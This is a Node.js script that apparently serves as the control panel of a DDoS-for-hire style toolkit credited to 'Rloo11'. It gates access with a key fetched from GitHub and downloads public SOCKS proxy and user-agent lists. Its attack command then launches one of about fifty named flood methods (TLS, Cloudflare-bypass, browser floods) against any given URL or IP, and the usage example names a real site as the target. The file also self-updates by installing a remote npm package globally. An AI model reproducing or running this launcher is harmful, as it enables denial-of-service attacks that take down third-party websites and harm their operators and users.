#!/usr/bin/env node

const { exec, spawn  } = require('child_process')
const readline = require('readline')
const url = require('url')
const fs = require('fs')
const axios = require('axios')
const path = require('path')
const version = '8.1.6'
let processList = [];

const permen = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})
// [========================================] //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// [========================================] //
async function banner() {
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⢀⣤⣶⣶⣖⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣾⡟⣉⣽⣿⢿⡿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢠⣿⣿⣿⡗⠋⠙⡿⣷⢌⣿⣿⠀⠀⠀⠀⠀⠀⠀𝕽𝖑𝖔𝖔 𝖉𝖉𝖔𝖘🕊️🪽 𝑪2 𝑾𝑬𝑩𝑺𝑰𝑻𝑬 ${version}
⣷⣄⣀⣿⣿⣿⣿⣷⣦⣤⣾⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀𝙾𝚠𝚗𝚎𝚛: 𝕽𝖑𝖔𝖔11•𝐒𝐓𝐎𝐑𝐄🕊️🪽
⠈⠙⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⢀⠀⠀⠀⠀𝙿𝚛𝚎𝚖𝚒𝚞𝚖: 𝚈𝚎𝚜
⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠻⠿⠿⠋⠀⠀.  𝚃𝚎𝚕𝚎𝚐𝚛𝚊𝚖: @Rloo11
⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀𝙼𝚢 𝚃𝚎𝚊𝚖: @CTR INDONESIA
⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⡄
⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⢀⡾⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣷⣶⣴⣾⠏⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠛⠋⠁⠀⠀⠀⠀
========================================================================`)}
// [========================================] //
async function scrapeProxy() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt');
    const data = await response.text();
    fs.writeFileSync('proxy.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
async function scrapeUserAgent() {
  try {
    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
function clearProxy() {
  if (fs.existsSync('proxy.txt')) {
    fs.unlinkSync('proxy.txt');
  }
}
// [========================================] //
function clearUserAgent() {
  if (fs.existsSync('ua.txt')) {
    fs.unlinkSync('ua.txt');
  }
}
// [========================================] //
async function bootup() {
  try {
    console.log(`|| ▓░░░░░░░░░ || 10%`);
    await exec(`npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent`)
    console.log(`|| ▓▓░░░░░░░░ || 20%`);
    const getLatestVersion = await fetch('https://raw.githubusercontent.com/Xlamper/PermenMdXlamper-Version-8.1.6-/refs/heads/main/version.txt');
    const latestVersion = await getLatestVersion.text()
    console.log(`|| ▓▓▓░░░░░░░ || 30%`);
    if (version === latestVersion.trim()) {
    console.log(`|| ▓▓▓▓▓▓░░░░ || 60%`);
    
    const secretBangetJir = await fetch('https://raw.githubusercontent.com/Rloo1197/R3X/refs/heads/main/ngeri.txt');
    const password = await secretBangetJir.text();
    await console.log(`Login Key Required`)
    permen.question('[\x1b[1m\x1b[31m𝕽𝖔𝖔🕊️🪽 𝕾𝖊𝖈𝖚𝖗𝖎𝖙𝖞\x1b[0m]: \n', async (skibidi) => {
      if (skibidi === password.trim()) {
        console.log(`Successfuly Logged`)
        await scrapeProxy()
        console.log(`|| ▓▓▓▓▓▓▓░░░ || 70%`)
        await scrapeUserAgent()
        console.log(`|| ▓▓▓▓▓▓▓▓▓▓ || 100%`)
        await sleep(700)
        console.clear()
        console.log(`𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚃𝚘 𝕽𝖔𝖔💸🤡🪽 ${version}`)
        await sleep(1000)
		    await banner()
        console.log(`𝙺𝚎𝚝𝚒𝚔 "𝙼𝚎𝚗𝚞" 𝙵𝚘𝚛 𝚂𝚑𝚘𝚠 𝙰𝚕𝚕 𝙲𝚘𝚖𝚖𝚊𝚗𝚍`)
        sigma()
      } else {
        console.log(`Wrong Key`)
        process.exit(-1);
      }
    }) 
  } else {
      console.log(`This Version Is Outdated. ${version} => ${latestVersion.trim()}`)
      console.log(`Waiting Auto Update...`)
      await exec(`npm uninstall -g prmnmd-tuls`)
      console.log(`Installing update`)
      await exec(`npm i -g prmnmd-tuls`)
      console.log(`Restart Tools Please`)
      process.exit()
    }
  } catch (error) {
    console.log(`Are You Online?`)
  }
}
// [========================================] //
async function pushMonitor(target, methods, duration) {
  const startTime = Date.now();
  processList.push({ target, methods, startTime, duration })
  setTimeout(() => {
    const index = processList.findIndex((p) => p.methods === methods);
    if (index !== -1) {
      processList.splice(index, 1);
    }
  }, duration * 1000);
}
// [========================================] //
function monitorAttack() {
  console.log("\n𝙼𝚘𝚗𝚒𝚝𝚘𝚛 𝙰𝚝𝚝𝚊𝚌𝚔:\n");
  processList.forEach((process) => {
console.log(`𝚃𝚊𝚛𝚐𝚎𝚝: ${process.target}
𝙼𝚎𝚝𝚑𝚘𝚍𝚜: ${process.methods}
𝙳𝚞𝚛𝚊𝚝𝚒𝚘𝚗𝚜: ${process.duration} 𝚂𝚎𝚌𝚘𝚗𝚍𝚜
𝚂𝚒𝚗𝚌𝚎𝚜: ${Math.floor((Date.now() - process.startTime) / 1000)} 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 𝚊𝚐𝚘\n`);
  });
}
// [========================================] //
async function handleAttackCommand(args) {
  if (args.length < 3) {
    console.log(`Example: attack <url/ip> <duration> <methods>
attack https://xnxx.com 500 flood`);
    sigma();
	return
  }
const [target, duration, methods] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄.
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧⠀
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋⠀
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋.⢖⣫⠔⠋⠀⠀⠀
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀⠀⠀⠀⠀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
[===============ᴀᴛᴛᴀᴄᴋ ᴡᴇʙꜱɪᴛᴇ ʙʏ ʀᴏᴏ11😈🪽===============]
𝚃𝚊𝚛𝚐𝚎𝚝   : ${target}
𝙳𝚞𝚛𝚊𝚝𝚒𝚘𝚗  : ${duration}
𝙼𝚎𝚝𝚑𝚘𝚍𝚜  : ${methods}
𝙰𝚂       : ${result.as}
𝙸𝙿       : ${result.query}
𝙸𝚂𝙿      : ${result.isp}
𝙼𝚈 𝚃𝙴𝙰𝙼 : @CTR INDONESIA
𝙾𝚆𝙽𝙴𝚁 𝚃𝙾𝙾𝙻𝚂 : @Rloo11
𝚈𝙾𝚄𝚃𝚄𝙱𝙴 : https://youtube.com/@Rloo11

`)
} catch (error) {
  console.log(`Oops Something Went wrong`)
}
const metode = path.join(__dirname, `/lib/cache/${methods}`);
 if (methods === 'night-flood') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 40 proxy.txt flood`)
	sigma()
  } else if (methods === 'roo-flood') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
  } else if (methods === 'roo-traffic') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} GET 20`)
	sigma()
  } else if (methods === 'uam') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 40 proxy.txt`)
	sigma()
  } else if (methods === 'medusa') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 800 proxy.txt`)
	sigma()
  } else if (methods === 'night-bypas') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 40 proxy.txt bypass`)
	sigma()
  } else if (methods === 'tlsv1') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 40 proxy.txt`)
	sigma()
  } else if (methods === 'Rloo11') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 800`)
	sigma()
  } else if (methods === 'tornado') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} GET ${target} ${duration} 100 40 proxy.txt`)
	sigma()
  } else if (methods === 'xlamper-bom') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 200 40`)
	sigma()
  } else if (methods === 'mixmax') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 20`)
	sigma()
  } else if (methods === 'xlamper') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 200 20 proxy.txt`)
	sigma()
  } else if (methods === 'inferno') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 50 proxy.txt`)
	sigma()
  } else if (methods === 'killer') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 50 proxy.txt`)
	sigma()
  } else if (methods === 'tls-bypass') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 50 proxy.txt`)
	sigma()
  } else if (methods === 'lezkill') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'ctr') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'geckold') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'mix') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 50`)
	sigma()
  } else if (methods === 'mixsyn') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 50`)
	sigma()
	} else if (methods === 'pidoras') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
  } else if (methods === 'glory') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'skynet-tls') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'tls-vip') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'flood') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 60 10 proxy.txt 100`)
	sigma()
  } else if (methods === '404') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'aqua') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
	} else if (methods === 'astral') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
	} else if (methods === 'barave') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
	} else if (methods === 'bomba') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
	} else if (methods === 'bot') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
	} else if (methods === 'brow-x') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
	} else if (methods === 'browserddos') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
	} else if (methods === 'bypass-saturn') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
	} else if (methods === 'bypass-test') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
	} else if (methods === 'bypass-x') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
	} else if (methods === 'cfa') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
	} else if (methods === 'cfbypass') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 60`)
	sigma()
	} else if (methods === 'dev') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
	} else if (methods === 'dos') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
	} else if (methods === 'downrapid') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
	} else if (methods === 'dragonc2') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
	} else if (methods === 'esic') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
	} else if (methods === 'flood-bypass') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
  } else if (methods === 'tls') {
    pushMonitor(target, methods, duration)
     exec(`node ${metode} ${target} ${duration} 100 800`)
    sigma()
    } else if (methods === 'strike') {
      pushMonitor(target, methods, duration)
       exec(`node ${metode} GET ${target} ${duration} 10 90 proxy.txt --full`)
      sigma()
      } else if (methods === 'kill') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10`)
        sigma()
        } else if (methods === 'bypass') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 50 800 proxy.txt`)
          sigma()
          } else if (methods === 'raw') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration}`)
          sigma()
          } else if (methods === 'thunder') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 800 proxy.txt`)
          sigma()
          } else if (methods === 'rape') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${duration} 10 proxy.txt 70 ${target}`)
          sigma()
          } else if (methods === 'storm') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'starxtls') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'slim') {
       pushMonitor(target, methods, duration)
const destroy = path.join(__dirname, `/lib/cache/destroy`);
const storm = path.join(__dirname, `/lib/cache/storm`);
const rape = path.join(__dirname, `/lib/cache/rape`);
        exec(`node ${destroy} ${target} ${duration} 100 1 proxy.txt`)
        exec(`node ${storm} ${target} ${duration} 100 1 proxy.txt`)
        exec(`node ${rape} ${duration} 1 proxy.txt 70 ${target}`)
          sigma()
          } else {
    console.log(`Method ${methods} not recognized.`);
  }
};
// [========================================] //
async function sigma() {
const getNews = await fetch(`https://raw.githubusercontent.com/permenmd/cache/main/news.txt`)
const latestNews = await getNews.text();
const creatorCredits = `
𝐂𝐑𝐄𝐀𝐓𝐄𝐃 𝐁𝐘 R11🕊️🪽

𝚃𝚑𝚊𝚗𝚔𝚜 𝚃𝚘:
𝐆𝐎𝐃
𝐑𝐨𝐨𝟏𝟏
𝐏𝐫𝐢𝐲𝐱𝐥
𝐈𝐫𝐩𝐚𝐧
𝐎𝐜𝐭𝐨 𝐬𝐢 𝐩𝐦𝐨
𝐑𝐞𝐣𝐚 𝐚𝐧𝐣𝐚𝐲
𝐅𝐚𝐢𝐭𝐡 
𝐂𝐚𝐥𝐦
𝐂𝐓𝐑
`
permen.question('[\x1b[1m\x1b[32m𝕽𝖔𝖔11🕊️🪽\x1b[0m]: \n', (input) => {
  const [command, ...args] = input.trim().split(/\s+/);

  if (command === 'menu') {
    console.log(`
| methods      | show list of available methods
| attack       | launch ddos attack
| monitor      | show monitor attack
| credits      | show creator of these tools
| clear        | clear terminal
`);
    sigma();
  } else if (command === 'methods') {
    console.log(`
[====================METHODS DDoS====================]
|| 404     || DDoS WEBSITE BY Rloo11🕊🪽
|| aqua     || DDoS WEBSITE BY Rloo11🕊🪽
|| astral     || DDoS WEBSITE BY Rloo11🕊🪽
|| barave     || DDoS WEBSITE BY Rloo11🕊🪽
|| bomba     || DDoS WEBSITE BY Rloo11🕊🪽
|| bot     || DDoS WEBSITE BY Rloo11🕊🪽
|| brow-x     || DDoS WEBSITE BY Rloo11🕊🪽
|| browserddos     || DDoS WEBSITE BY Rloo11🕊🪽
|| bypass-saturn     || DDoS WEBSITE BY Rloo11🕊🪽
|| bypass-test     || DDoS WEBSITE BY Rloo11🕊🪽
|| bypass-x     || DDoS WEBSITE BY Rloo11🕊🪽
|| cfa     || DDoS WEBSITE BY Rloo11🕊🪽
|| cfbypass     || DDoS WEBSITE BY Rloo11🕊🪽
|| dev     || DDoS WEBSITE BY Rloo11🕊🪽
|| dos     || DDoS WEBSITE BY Rloo11🕊🪽
|| downrapid     || DDoS WEBSITE BY Rloo11🕊🪽
|| dragonc2     || DDoS WEBSITE BY Rloo11🕊🪽
|| esic     || DDoS WEBSITE BY Rloo11🕊🪽
|| flood      || DDoS WEBSITE BY Rloo11🕊🪽
|| flood-bypass     || DDoS WEBSITE BY Rloo11🕊🪽
|| tls        || DDoS WEBSITE BY Rloo11🕊🪽
|| strike     || DDoS WEBSITE BY Rloo11🕊🪽
|| kill       || DDoS WEBSITE BY Rloo11🕊🪽
|| raw        || DDoS WEBSITE BY Rloo11🕊🪽
|| bypass     || DDoS WEBSITE BY Rloo11🕊🪽
|| thunder    || DDoS WEBSITE BY Rloo11🕊🪽
|| storm      || DDoS WEBSITE BY Rloo11🕊🪽
|| rape       || DDoS WEBSITE BY Rloo11🕊🪽
|| destroy    || DDoS WEBSITE BY Rloo11🕊🪽
|| slim       || DDoS WEBSITE BY Rloo11🕊🪽
|| skynet-tls || DDoS WEBSITE BY Rloo11🕊🪽
|| glory      || DDoS WEBSITE BY Rloo11🕊🪽
|| mixsyn     || DDoS WEBSITE BY Rloo11🕊🪽
|| mix        || DDoS WEBSITE BY Rloo11🕊🪽
|| pidoras     || DDoS WEBSITE BY Rloo11🕊🪽
|| ctr        || DDoS WEBSITE BY Rloo11🕊🪽
|| geckold    || DDoS WEBSITE BY Rloo11🕊🪽
|| lezkill    || DDoS WEBSITE BY Rloo11🕊🪽
|| tls-vip    || DDoS WEBSITE BY Rloo11🕊🪽
|| tls-bypass || DDoS WEBSITE BY Rloo11🕊🪽
|| killer     || DDoS WEBSITE BY Rloo11🕊🪽
|| mixmax      || DDoS WEBSITE BY Rloo11🕊🪽
|| xlamper    || DDoS WEBSITE BY Rloo11🕊🪽
|| Rloo11        || DDoS WEBSITE BY Rloo11🕊🪽 (New Methods)
|| inferno    || DDoS WEBSITE BY Rloo11🕊🪽
|| xlamper-bom|| DDoS WEBSITE BY Rloo11🕊🪽
|| tornado    || DDoS WEBSITE BY Rloo11🕊🪽
|| tlsv1      || DDoS WEBSITE BY Rloo11🕊🪽
|| medusa     || DDoS WEBSITE BY Rloo11🕊🪽
|| uam        || DDoS WEBSITE BY Rloo11🕊🪽
|| Rloo11-traffic|| DDoS WEBSITE BY Rloo11🕊🪽 (New Methods)
|| Rloo11-flood  || DDoS WEBSITE BY Rloo11🕊🪽 (New Methods)
|| night-flood|| DDoS WEBSITE BY Rloo11🕊🪽 (Owner Only)
|| night-bypas|| DDoS WEBSITE BY Rloo11🕊🪽 (Owner Only)
[====================METHODS DDoS====================]
`);
    sigma();
  } else if (command === 'credits') {
    console.log(`
${creatorCredits}`);
    sigma();
  } else if (command === 'attack') {
    handleAttackCommand(args);
  } else if (command === 'monitor') {
    monitorAttack()
    sigma()
  } else if (command === 'clear') {
    banner()
    sigma()
    } else {
    console.log(`${command} Not Found`);
    sigma();
  }
});
}
// [========================================] //
function clearall() {
  clearProxy()
  clearUserAgent()
}
// [========================================] //
process.on('exit', clearall);
process.on('SIGINT', () => {
  clearall()
  process.exit();
});
process.on('SIGTERM', () => {
clearall()
 process.exit();
});

bootup()
